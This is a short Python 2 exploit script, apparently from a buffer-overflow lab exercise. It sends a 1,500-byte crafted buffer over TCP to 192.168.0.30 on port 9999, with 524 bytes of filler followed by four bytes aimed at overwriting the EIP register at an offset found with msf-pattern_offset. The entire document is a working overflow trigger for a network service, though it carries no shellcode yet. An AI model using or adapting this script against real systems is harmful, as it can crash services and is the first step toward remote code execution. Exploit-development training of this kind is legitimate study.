#!/usr/bin/python
import socket

try:
    print "\nSending evil buffer..."
    # Per msf-pattern_offset, exact match at 524 bytes 
    filler = "A" * 524
    eip = "B" * 4
    trail = "C" * 4
    trail2 = "D" * (1500 - len(filler) - len(eip) - len(trail))

    buffer = filler+eip+trail+trail2

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.0.30",9999))
    s.send(buffer)

    s.close()

    print "\nDone!"
except:
    print "Could not connect!"

